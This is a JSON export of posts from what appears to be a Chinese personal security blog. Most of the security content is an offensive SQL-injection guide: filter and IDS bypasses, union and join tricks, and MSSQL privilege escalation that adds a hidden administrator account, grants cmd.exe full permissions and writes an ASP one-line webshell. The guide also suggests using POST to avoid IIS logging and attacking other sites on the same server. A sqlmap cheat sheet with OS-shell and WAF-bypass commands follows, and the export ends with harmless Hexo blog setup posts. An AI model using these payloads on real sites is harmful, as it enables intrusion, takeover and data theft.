‘sw’显然可以很轻松的绕过“=”“&gt;”的限制……8、通过IN绕过与上面的LIKE的思路差不多,如or ‘swords’ IN (‘swords’)9、通过BETWEEN绕过如or ‘swords’ BETWEEN ‘rw’ AND ‘tw’10、通过&gt;或者&lt;绕过or ‘swords’ &gt; ‘sw’or ‘swords’ &lt; ‘tw’or 1&lt;3……11、运用注释语句绕过用//代替空格，如：UNION // Select //user，pwd，from tbluser用//分割敏感词，如：U// NION // SE// LECT //user，pwd from tbluser12、用HEX绕过，一般的IDS都无法检测出来0x730079007300610064006D0069006E00 =hex(sysadmin)0x640062005F006F0077006E0065007200 =hex(db_owner) 九、注入经验1.有些人会过滤Select、Update、Delete这些关键字，但偏偏忘记区分大小写，所以大家可以用selecT这样尝试一下。2.在猜不到字段名时，不妨看看网站上的登录表单，一般为了方便起见，字段名都与表单的输入框取相同的名字。3.特别注意：地址栏的+号传入程序后解释为空格，%2B解释为+号，%25解释为%号，具体可以参考URLEncode的相关介绍。4.用Get方法注入时，IIS会记录你所有的提交字符串，对Post方法做则不记录，所以能用Post的网址尽量不用Get。 猜解Access时只能用Ascii逐字解码法，SQLServer也可以用这种方法，只需要两者之间的区别即可，但是如果能用SQLServer的报错信息把值暴露出来，那效率和准确率会有极大的提高。十、几个oracle注入的时候需要注意的地方1)OracIe注入的时候，union语句的前后类型必须要匹配，要不然会查询不成功。oracle类型常见的有字符类型、数字类型和日期类型等 一般我们能用来做union查询并显示的是字符类型和数字类型。前面构造的 union select 1,2,3,4,5,6,7,8,9,10,11,1213,14,15,16 这个SQL语句的union后面全部是数字类型，而前面肯定有其它类型，所以是不能查询成功的。oracle并不会自己做数据类型转换，但是oracle中可以用NULL匹配所有的数据类型，所以我们等会可以先全部SeIect NULL，然后再逐一检查union之前所select的类型。2)select语句后面必须要跟表名，要不然也不能查询成功。”seIect 1,2,3 这样的语句在SQL Server和MySQL中是可以成功执行的，但在oracIe中必须在后面加上表名．比如 select 1,2,3 from admin才行。不过这也不是问题。oracle中有个默认谁都有权限的表 dua ．我们可以在select后面加上这个表名。 十一、偏移注射关于Union偏移注射这个东西，最早貌似是lake2大黑客提出来的，以前一直当他是鸡肋，没去关注过，直到昨天遇到一个mysql 4.1的点。表，列都猜出来了，就差数据。因为他的参数是按“,”分割的，所以在注射的时候必须避开逗号，这样一来普通的union就用不成了，想暴力猜解也不行，因为substring也得用到逗号。无奈中想起join语句，偏移注射里面有一个很重要的技巧就是用join语句来控制字段数和数据显示的位置。麻烦的地方在于很多时候你根本不知道目标系统的环境，表里到底有多少列，数据类型什么的，怎么把他拼装到凑齐字段数，只能靠乱猜。目标网站order by 7正常，order by 8无返回，那么一共是7个字段，按照通常的做法，应该是先and 1=2 union select 1,2,3,4,5,6,7#来看看情况，这里因为要避开逗号，就必须用到join语句。但是不知道用户表一共有几列，没有关系，我们可以用select from ((select username from users)as a join (select username from users)as b on a.username=b.username)，把select出部分字段的结果集当做一个表，然后来join到一起，这样只要把(select username from users)as a重复7次，就可以把字段补齐。上面的语句在mysql5里面可以正常执行，也可以用到union子句中，可是在mysql4里就报语法错误，看来4.x不支持这么复杂的嵌套。修改了一下：select from users as a join (select id from users) as b on a.id=b.id这样在4.1里可以正常执行，4.0因为不支持子语句，简单的说就是不支持()里带select，所以就木有办法鸟。但是这样又有问题鸟，因为第一个select后面必须跟，否则只会返回第一列。Mysql的join语句默认应该是inner join，也就是内连接，我尝试换成left join或者right join都不行，我记得mysql4应该是支持左连接和右连接的，搞不懂这里为什么行不通。这么一来又必需猜目标表的字段数了，而且目标表的字段数必需＜=语句里select出的字段数才行，也受显示数据字段的制约。好处就是不知道列名也没关系，可以用常数来代替，即select 1,2,3,4,5 union select from users as a join (select 1 from users) as b join (select 1 from users) as c on a.id=1这样就完全避开了“,”，select出来的数据里可能会有很多重复，用distinct关键字过滤掉即可。如果目标表的字段&gt;前面选择的字段也没关系，因为必需保证最前面的字段是，找一个字段少一点的表，即select from news as a join (select username from users) as b，不过这个东西受到扫出来的表名，字段数，显示数据字段的制约，比较鸡肋了。以上语句在mysql里测试成功，如果要在access或者mssql里使用，估计得另外调试。这个跟以前提出来那个偏移注射有些区别，也姑且算另外一种意义上的偏移注射吧。核心思想就是不断的join来补齐字段，从而避开。最郁闷的是，最后竟然是用fckeditor搞定shell的，真没技术含量，一下午白研究了-_-刚才在外面骑车的时候，突然想到，之前的语句select from users as a join (select id from users) as b on a.id=b.id前面必须要用到是因为他并没有把这个select from users as a作为一个整体来解析，而是将users as a跟后面的join到一起了，即select from (users as a join (select id from users) as b on a.id=b.id)，当然前面要用，才能返回子语句里所有的列数了。那么改写成select distinct from (select 1 from users)as a join (select 2 from users)as b即可，然后依次像后面join补齐字段，最后把合适的地方换成用户名密码字段即可。mysql 4.1下测试成功，当然还是需要知道列名，呵呵十二、猜出绝对路径进行差异备份MSSQL数据库，还可以猜解网站存放在服务器中的根目录，通过差异备份备份出一句话，然后通过一句话木马客户端，上传脚本木马如果一个网站注入点是MYSQL数据库，且是DB权限，或者是SA权限，能够列目录，那么就好办了，找到网站的目录，目录通常在D和E盘，备份个小马，上地址访问看看成功没，直接备份大马貌似不行，成功后，再输入大马内容 十三、通过注入点判断服务器的硬盘(分区)是否有访问权http://www.fun***.com/user/wmadown.asp?id=48187，这个是注入点了的。现在我们用 SQL查询语句试试，C盘是否有访问权限。语句是：and (select count() from c:\\autoexec.bat.c)&gt;0解释一下原理，其它AC数据库也是可以跨库查询。只要把 from 后的表名改成MDB数据库的硬盘绝对地址，后台加上个“. ”，接上要查的表名。例如，我要查D盘yqf.mdb中的ADMIN表：and (select count() from d:\\yqf.mdb.admin)&gt;0这样的语句，只要知道服务器硬盘其它数据库地址，ACCESS也能跨库查询。只是不知道地址，所以这个无关紧要。and (select count() from c:\\autoexec.bat.c)&gt;0为什么说用这句可以判断是否有硬盘访问权限呢？大家都知道c:\\autoexec.bat 是系统里自有的文件 无论哪个系统都有，而大家默认安装WINDOWS也是装在C盘，如果这样找不到文件的话，你可以试试其它盘。现在我们提交：and (select count() from c:\\autoexec.bat.c)&gt;0看到吧“不可识别的数据库格式’c:\\AUTOEXEC.BAT’”报错信息，这样表示C盘有访问的权限。因为读到了AUTOEXEC.BAT把autoexec.bat当mdb数据库来处理了，所以就出现这样的错误提示。现在我们用刚传的马去看看，呵，C盘有访问的权限吧。反之，如果没有访问权限，则会提示“c:\\autoexec.bat 已被另一种方式打开，或者无权访问。”类似这样的提示，就是无权限访问了。不过 autoexec.bat 可以测试，比如 c:\\winnt\\system32\\cmd.exe，这些系统原有的文件都可以用来试。 十四、sa下的注入提权虽说这年头讨论注射已经有点过时了,何况还是sa,但是在遇到我这种情况时,怕只有对injection研究高深的人才能突破吧…本文讨论仍然是sql_server &amp;Win32下的环境是的,网络上已经发布了不少对于存储扩展应用的文档,但大部分是转载的,真正的原理少只又少比如xp_subdirs 是如何获取目录的,是cracert tables 然后select反馈?比如xp_cmdshell 是如何执行cmdshell的 dbo下的system继承?比如sandboxmode下的net user是如何执行的,vbs调用的Shell()?等等等等~~sa的注射搞不下服务器真有点丢人,前提继承的是system :) ,至于其他牛角尖的环境就留给那些提问者吧好了,说说一些特殊的环境吧我们知道,各扩展存储都有调用他们对应的dll文件,例如: sp_OACreate调用odsole70.dll xp_Cmdshell调用xplog70.dllOK,进入正题:情况1:dll文件被替换(因为dll是存储在sqlserver指定路径中的),比如sp_Oacreate被替换成xpweb70.dll如何测试这种情况呢?可以exec sp_oraceate ‘xxxxxxx’ 提示:找不到sp_oraceate,对应的xx.dll没有此函数之类的解决方法:exec sp_dropextendedproc ‘Sp_OACreate’EXEC sp_addextendedproc Sp_OACreate ,@dllname =’上传dll’情况2:xp_cmdhshell 或oacreate 无法利用时,采用sandboxmode(沙盒模式)沙盒模式是通过access创建vbs 函数来执行shell的具体语法就不说了前提是要能执行xp_regwrite 开启它但这个利用方法有个局限性,它并不是通过cmd 来调用文件执行的,一般情况下是cmd.exe /c net user 这样,而他是net user 为什么呢? 这么理解吧 shell ‘c:\\windows\\system32\\net.exe user’这样明白了吧,他只支持system32下的文件调用而一般的dir ,echo,copy…等等都无法直接利用 可以尝试cmd /c dir….. 这样调用由此引发情况3:cmd,net被禁或更改,这是比较纳闷的问题,而且国内似乎也没有相关的解决办法回到情况二,如上所述sandboxmode能调用system32下的文件,别忘记了有个cacls,有了它,那么网站的权限配置几乎为0了(再次强调,此法必须继承system权限,并且cmdshell等无法利用的情况下)测试方法:Select * From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\\windows\\system32\\ias\\ias.mdb’,’select shell(“cacls c:\\windows\\system32\\cmd.exe /t /e /c /g system:F”)’); 赋予cmd.exe的system用户所有权限如果cmd被删或者net.exe,net1.exe被禁也可calcs c:\\windows\\system32\\net.exe /t /e /c /g system:f相比而言sandboxmode的局限性比较小,只需要可以使用xp_regwrite 开启而一般站点管理员对xp_regwrite 的安全配置会比较马虎xp_regwrite被删时,可EXEC sp_addextendedproc xp_regwrite,’xpstar.dll’恢复本文讨论的只是sqlserver 注射下的冰山一角，当是抛砖引玉吧~十五、更高级的union select，跨库查询这里说的是ACCESS的跨库，原文地址：http://www.4ngel.NET/article/46.htm 十六、SQL注射及提权经验MSSQL数据库：1：SA权限一般说来,无论谁拿到一个SA权限的注射点。都会很开心。 直接执行net user等命令。 可列目录但不能执行系统命令。可以列出目录找出网站中可以利用的地方,比如ewebeditor,或者上传地址(试试是否有上传漏洞),等等。或者找服务器下其他网站,然后入侵之。如果无其他漏洞可以找到,那就利用备份得到一个webshell。 无cmdshell那就恢复之。详细请参考http://www.hacker.com.cn/forum/view_118677.html ; 中的6楼 如果无法恢复cmdshellhttp://forum.eviloctal.com/viewthread.php?tid=31487&amp;highlight=sa可以参考下这篇文章。也就是利用的sp_oacreate来执行。可以通过5次shift来登陆3389还可以利用sp_makewebtask直接在web目录里写入一句话马http://127.0.0.1/sql.asp?id=1&#39;;exec%20sp_makewebtask%20&#39;d:\\www\\xxx.asp&#39;,&#39;%20select%20‘’&lt;%25execute(request(“a”))%25&gt;’’%20’;–还可以利用沙盒模式提权EXEC%20master.dbo.xp_regwrite%20’HKEY_LOCAL_MACHINE’,’SoftWare\\Microsoft\\Jet\\4.0\\Engines’,’SandBoxMode’,’REG_DWORD’,0;–SelectFrom OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\\windows\\system32\\ias\\ias.mdb’,’select shell(“net user aloner$ aloner /add”)’);–;SelectFrom OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\\windows\\system32\\ias\\ias.mdb’,’select shell(“net localgroup administrators aloner$ /add”)’);–如果上述方法仍然不行,那就猜解出后台帐户和密码,然后登陆后台。看看有没什么可以利用的。2：db权限Db权限可以列出网站目录，然后备份。用一句话连接得到webshell.如果可以列目录,但无法备份，也同样可以利用找其他漏洞来入侵。毕竟整个网站都可以被你浏览了。然后就是猜解出后台帐户和密码登陆后台了。还有一种就是关于一篇db权限备份到启动项得到系统权限。可以参考下这篇文章http://www.hacker.com.cn/article/view_13207.htmlpublic权限此权限很多人不会利用。但是可以列出目录的。具体参考这篇文章http://www.hacker.com.cn/forum/view_118677.html第10楼。Mysql数据库:Root权限下可以直接利用loadfile读取网站的文件内容(网站的配置信息)然后就是注入语句得到管理员密码，登陆后台","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://www.hackerui.me/tags/渗透/"}]},{"title":"sqlmap基础注入","slug":"sqlmap基础注入","date":"2017-04-16T06:18:28.000Z","updated":"2017-05-09T05:01:55.683Z","comments":true,"path":"2017/04/16/sqlmap基础注入/","link":"","permalink":"http://www.hackerui.me/2017/04/16/sqlmap基础注入/","excerpt":"sqlmap基础注入 SQLMAP是一款基于python开发的SQL注入工具，几乎支持现在所有的数据库，功能非常强大。由于是国外的产品，所以对于我这种英语水平不高的菜鸟来说，使用起来会有点困难。虽然现在已经能熟练使用大部分功能了，但还是把中文解释贴过来，方便以后使用。Options（选项）：–version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）","text":"sqlmap基础注入 SQLMAP是一款基于python开发的SQL注入工具，几乎支持现在所有的数据库，功能非常强大。由于是国外的产品，所以对于我这种英语水平不高的菜鸟来说，使用起来会有点困难。虽然现在已经能熟练使用大部分功能了，但还是把中文解释贴过来，方便以后使用。Options（选项）：–version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）Target（目标）：以下至少需要设置其中一个选项，设置目标URL。-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。Request（请求）：这些选项可以用来指定如何连接到目标URL。–data=DATA 通过POST发送的数据字符串–cookie=COOKIE HTTP Cookie头–cookie-urlencode URL 编码生成的cookie注入–drop-set-cookie 忽略响应的Set – Cookie头信息–user-agent=AGENT 指定 HTTP User – Agent头–random-agent 使用随机选定的HTTP User – Agent头–referer=REFERER 指定 HTTP Referer头–headers=HEADERS 换行分开，加入其他的HTTP头–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）–auth-cert=ACERT HTTP认证证书（key_file，cert_file）–proxy=PROXY 使用HTTP代理连接到目标URL–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）–ignore-proxy 忽略系统默认的HTTP代理–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）–retries=RETRIES 连接超时后重新连接的时间（默认3）–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式–safe-url=SAFURL 在测试过程中经常访问的url地址–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URLOptimization（优化）：这些选项可用于优化SqlMap的性能。-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）Injection（注入）：这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据Detection（检测）：这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符Fingerprint（指纹）：-f, –fingerprint 执行检查广泛的DBMS版本指纹Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。-b, –banner 检索数据库管理系统的标识–current-user 检索数据库管理系统当前用户–current-db 检索数据库管理系统当前数据库–is-dba 检测DBMS当前用户是否DBA–users 枚举数据库管理系统用户–passwords 枚举数据库管理系统用户密码哈希–privileges 枚举数据库管理系统用户的权限–roles 枚举数据库管理系统用户的角色–dbs 枚举数据库管理系统数据库–tables 枚举的DBMS数据库中的表–columns 枚举DBMS数据库表列–dump 转储数据库管理系统的数据库中的表项–dump-all 转储所有的DBMS数据库表中的条目–search 搜索列（S），表（S）和/或数据库名称（S）-D DB 要进行枚举的数据库名-T TBL 要进行枚举的数据库表-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户–exclude-sysdbs 枚举表时排除系统数据库–start=LIMITSTART 第一个查询输出进入检索–stop=LIMITSTOP 最后查询的输出进入检索–first=FIRSTCHAR 第一个查询输出字的字符检索–last=LASTCHAR 最后查询的输出字字符检索–sql-query=QUERY 要执行的SQL语句–sql-shell 提示交互式SQL的shellBrute force（蛮力）：这些选项可以被用来运行蛮力检查。–common-tables 检查存在共同表–common-columns 检查存在共同列User-defined function injection（用户自定义函数注入）：这些选项可以用来创建用户自定义函数。–udf-inject 注入用户自定义函数–shared-lib=SHLIB 共享库的本地路径File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。 –os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型General（一般）：这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。Miscellaneous（杂项）：–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面SQLMAP实战操作：1.ACCESS数据库：sqlmap.py -u “url” /-u为常规扫描参数/sqlmap.py -u “url” –tables /–tables拆数据库表/sqlmap.py -u “url” –columns -T “要拆的表名”/列出指定表名/sqlmap.py -u “url” –dump -T “要拆的表名”-C “要拆的字段名” /–dump为拆解字段名会保存在sqlmap/output目录下/2.MYSQL数据库：sqlmap.py -u “url” /扫描注入点/sqlmap.py -u “url” –dbs /列出所有数据库/sqlmap.py -u “url” –current-db /列出当前数据库/sqlmap.py -u “url” –current-user /列出当前用户/sqlmap.py -u “url” –tables -D “当前数据库名” /拆解当前数据库表/sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /拆解指定表字段名/sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”3.SQLSERVER数据库：sqlmap.py -u “url” /扫描注入点/sqlmap.py -u “url” –dbs /列出所有数据库/sqlmap.py -u “url” –current-db /列出当前数据库/sqlmap.py -u “url” –current-user /列出当前用户/sqlmap.py -u “url” –tables -D “当前数据库名” /拆解当前数据库表/sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /拆解指定表字段名/sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”SQLSERVER操作和MYSQL是一样的！！！常见的几种数据库！！！4.COOKIE注入：sqlmap.py -u “www.xxx.com/asp或者www.xxx.com/php” –cookie “参数名如id=1” –level 2/level为提升权限/什么数据库就按照上面的数据库加上cookie语句拆解就行了5.POST注入：抓包保存到SQLMAP目录下.txt的文件然后输入指令sqlmap.py -r xxx.txt /xxx.txt为保存包文件的文件名”sqlmap.py -u “url” –data “POST参数”6.执行shell命令：sqlmap.py -u “url” –os-cmd=”net user” /执行net user命令/sqlmap.py -u “url” –os-shell /系统交互的shell/7.注入HTTP请求 :sqlmap.py -r xxx.txt –dbs /xxx.txt内容为HTTP请求/8.绕过WAF的tamper插件使用：sqlmap.py -u “url” –tamper “xxx.py”sqlmap.py -u “url” –tamper=”xxx.py”关于tamper脚本详细说明在本博客中有，（敬请期待）9.将注入语句插入到指定位置：sqlmap.py -u “url(www.xxx.com/id/1.html)” –dbs有些网站是采用伪静态的页面使用SQLMAP的普通注入是不行的，所以SQLMAP提供了””参数将SQL语句插入指定位置，一般用于伪静态注入。在使用HTTP注入时使用-r参数也可以直接在文本中添加号10.延时注入：sqlmap –dbs -u “url” –delay 0.5 /延时0.5秒/sqlmap –dbs -u “url” –safe-freq /请求2次/11.使用谷歌语法搜索注入(Google hack)：sqlmap.py -g “inurl:asp?id=1” /*””内为搜索语法，如：inurl,intitle,site,filetype等等我朋友总结了很多可以参考一下：http://blog.csdn.net/wsh19930305/article/details/62247962同时欢迎大家关注小瑞的个人博客：www.hackerui.me","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://www.hackerui.me/tags/渗透/"}]},{"title":"Hexo搭建个人博客","slug":"2017-04-15-HEXO搭建个人博客","date":"2017-04-15T07:42:06.000Z","updated":"2017-05-09T05:01:11.612Z","comments":true,"path":"2017/04/15/2017-04-15-HEXO搭建个人博客/","link":"","permalink":"http://www.hackerui.me/2017/04/15/2017-04-15-HEXO搭建个人博客/","excerpt":"Hexo搭建个人博客技巧 经过各种找资料，踩过各种坑，终于使用 hexo 搭建个人博客初步完成了，域名目前用得时 github 的，我的 hexo 是 3.1.1 版本，hexo 不同的版本，很多配置都不一样。好吧，废话不多说了，开始吧。 本篇文章累计了大量评论，和我的一些解答，读者有什么问题可以先看看评论，或者搜下关键字，如果还是有问题可以给我在评论里给我留言，问题很着急的可以加我 ＱＱ：1767361332 ，或者给我发邮件：wang_xiansen0@163.com ，都可以，如果你已经搭建完成了，可以看看我的另一篇博客HEXO进阶，有讲如何能百度搜索你的博客、多台电脑使用HEXO发布博客等。我现在的博客是使用 Jekyll 搭建的，如果你想使用我现在的模板请看Jekyll搭建个人博客","text":"Hexo搭建个人博客技巧 经过各种找资料，踩过各种坑，终于使用 hexo 搭建个人博客初步完成了，域名目前用得时 github 的，我的 hexo 是 3.1.1 版本，hexo 不同的版本，很多配置都不一样。好吧，废话不多说了，开始吧。 本篇文章累计了大量评论，和我的一些解答，读者有什么问题可以先看看评论，或者搜下关键字，如果还是有问题可以给我在评论里给我留言，问题很着急的可以加我 ＱＱ：1767361332 ，或者给我发邮件：wang_xiansen0@163.com ，都可以，如果你已经搭建完成了，可以看看我的另一篇博客HEXO进阶，有讲如何能百度搜索你的博客、多台电脑使用HEXO发布博客等。我现在的博客是使用 Jekyll 搭建的，如果你想使用我现在的模板请看Jekyll搭建个人博客 正文： 这边教程是针对与Mac的，参考链接，由于原文讲到的hexo是以前的老版本，所以现在的版本配置的时候会有些改动。 之前是想着写博客，一方面是给自己做笔记，可以提升自己的写作、总结能力，一个技术点我们会使用，并不难，但是要做到让让别人也能听懂我们讲得，还是需要一定的技巧和经验的。很多类似于CSDN、博客园也都可以写文章，但是页面的样式我，不是太喜欢，简书还算好点得。最近看到一些大神们的博客（在我的友情链接里有），貌似都是用hexo写得，我也依葫芦画瓢的搭建了一个。不罗嗦了，直接上搭建步骤。 配置环境安装Node（必须）作用：用来生成静态页面的到Node.js官网下载相应平台的最新版本，一路安装即可。 安装Git（必须）作用：把本地的hexo内容提交到github上去.安装Xcode就自带有Git，我就不多说了。 申请GitHub（必须）作用：是用来做博客的远程创库、域名、服务器之类的，怎么与本地hexo建立连接等下讲。github账号我也不再啰嗦了,没有的话直接申请就行了，跟一般的注册账号差不多，SSH Keys，看你自己了，可以不配制，不配置的话以后每次对自己的博客有改动提交的时候就要手动输入账号密码，配置了就不需要了，怎么配置我就不多说了，网上有很多教程。 正式安装HEXO Node和Git都安装好后，可执行如下命令安装hexo： $ sudo npm install -g hexo 初始化创建一个文件夹，如：Blog，cd到Blog里执行hexo init的。命令： hexo init 好啦，至此，全部安装工作已经完成！ 生成静态页面继续再Blog目录下执行如下命令，生成静态页面 hexo generate （hexo g 也可以） 本地启动启动本地服务，进行文章预览调试，命令： hexo server 浏览器输入http://localhost:4000我不知道你们能不能，反正我不能，因为我还有环境没配置好 常见的HEXO配置错误：12345ERROR Plugin load failed: hexo-server原因： Besides, utilities are separated into a standalone module. hexo.util is not reachable anymore.解决方法，执行命令：$ sudo npm install hexo-server 12345678910执行命令hexo server，提示：Usage: hexo&lt;Command&gt; ....原因：我认为是没有生成本地服务解决方法，执行命令：$ npm install hexo-server --save提示：hexo-server@0.1.2 node_modules/hexo-server.... 表示成功了[参考](https://hexo.io/zh-cn/docs/server.html) 这个时候再执行：$ hexo-server 得到: INFO Hexo is running at http://0.0.0.0:4000/. Press Ctrl+C to stop. 这个时候再点击http://0.0.0.0:4000，正常情况下应该是最原始的画面，但是我看到的是：白板和Cannot GET / 几个字原因： 由于2.6以后就更新了，我们需要手动配置些东西，我们需要输入下面三行命令： npm install hexo-renderer-ejs --save npm install hexo-renderer-stylus --save npm install hexo-renderer-marked --save 这个时候再重新生成静态文件，命令： hexo generate （或hexo g） 启动本地服务器： hexo server （或hexo s） 再点击网址http://0.0.0.0:4000 OK终于可以看到属于你自己的blog啦，?，虽然很简陋，但好歹有了一个属于自己的小窝了。参考链接，本地已经简单的设置好了，但是现在域名和服务器都是基于自己的电脑，接下来需要跟github进行关联。 配置Github建立Repository建立与你用户名对应的仓库，仓库名必须为【your_user_name.github.io】，固定写法然后建立关联，我的Blog在本地/Users/leopard/Blog，Blog是我之前建的东西也全在这里面，有： Blog ｜ ｜－－ _config.yml ｜－－ node_modules ｜－－ public ｜－－ source ｜－－ db.json ｜－－ package.json ｜－－ scaffolds ｜－－ themes 现在我们需要_config.yml文件，来建立关联，命令： vim _config.yml 翻到最下面，改成我这样子的，注意： : 后面要有空格 deploy: type: git repository: https://github.com/leopardpan/leopardpan.github.io.git branch: master 执行如下命令才能使用git部署 npm install hexo-deployer-git --save 网上会有很多说法，有的type是github, 还有repository 最后面的后缀也不一样，是github.com.git，我也踩了很多坑，我现在的版本是hexo: 3.1.1，执行命令hexo -vsersion就出来了,貌似3.0后全部改成我上面这种格式了。忘了说了，我没用SSH Keys如果你用了SSH Keys的话直接在github里复制SSH的就行了，总共就两种协议，相信你懂的。然后，执行配置命令： hexo deploy 然后再浏览器中输入http://5279314.github.io/就行了，我的 github 的账户叫 5279314 ,把这个改成你 github 的账户名就行了 部署步骤每次部署的步骤，可按以下三步来进行。 hexo clean hexo generate hexo deploy 一些常用命令： hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo help #查看帮助 hexo version #查看Hexo的版本 这里有大量的主题列表使用方法里面都有详细的介绍，我就不多说了。我这里有几款个人认为不错的主题，免去你们，一个一个的选了，欢迎吐槽我的审美，? Cover - A chic theme with facebook-like cover photo Oishi - A white theme based on Landscape plus and Writing. Sidebar - Another theme based on Light with a simple sidebar TKL - A responsive design theme for Hexo. 一个设计优雅的响应式主题 Tinnypp - A clean, simple theme based on Tinny Writing - A small and simple hexo theme based on Light Yilia - Responsive and simple style 优雅简洁响应式主题，我用得就是这个。 Pacman voidy - A theme with dynamic tagcloud and dynamic snow 一些基本路径 文章在 source/_posts，编辑器可以用 Sublime，支持 markdown 语法。如果想修改头像可以直接在主题的 _config.yml 文件里面修改，友情链接，之类的都在这里，修改名字在 public/index.html 里修改，开始打理你的博客吧，有什么问题或者建议，都可以提出来，我会继续完善的。 Markdown语法参考链接: 作业部落 Q&amp;A 问：如何让文章想只显示一部分和一个 阅读全文 的按钮？答：在文章中加一个 &lt;!--more--&gt; ， &lt;!--more--&gt; 后面的内容就不会显示出来了。 问：本地部署成功了，也能预览效果，但使用 username.github.io 访问，出现 404 .答：首先确认 hexo d 命令执行是否报错，如果没有报错，再查看一下你的 github 的 username.github.io 仓库，你的博客是否已经成功提交了，你的 github 邮箱也要通过验证才行。 转载请注明原地址，小瑞安全博客：http://5279314.github.io 谢谢！","categories":[],"tags":[{"name":"博客","slug":"博客","permalink":"http://www.hackerui.me/tags/博客/"}]},{"title":"Hello World","slug":"hello-world","date":"2017-04-14T07:42:06.000Z","updated":"2017-04-14T03:04:30.716Z","comments":true,"path":"2017/04/14/hello-world/","link":"","permalink":"http://www.hackerui.me/2017/04/14/hello-world/","excerpt":"","text":"在百度的帮助下，这个小瑞安全博客终于搭建起来了。 折腾了两天多，在github page上看到自己的博客加载下来时，突然有种错综复杂的恍惚感。是的，它不是qq空间，不是新浪博客，不是豆瓣小站，也不是贴吧。它更像是属于自己的一块小小的领地，因而我满足于这种归属感。我愿在上面安静劳作。 一个农民，通过自身努力终于分到了一块地，不再需要在地主的土地上创造流量价值时，于是翻身作主的他可以宣告说：Hello World。当然这个农民确切来说是个码农。 感谢Zespia提供的slash主题。我很喜欢这种色调。 ——BY:小瑞","categories":[],"tags":[{"name":"测试","slug":"测试","permalink":"http://www.hackerui.me/tags/测试/"}]}]}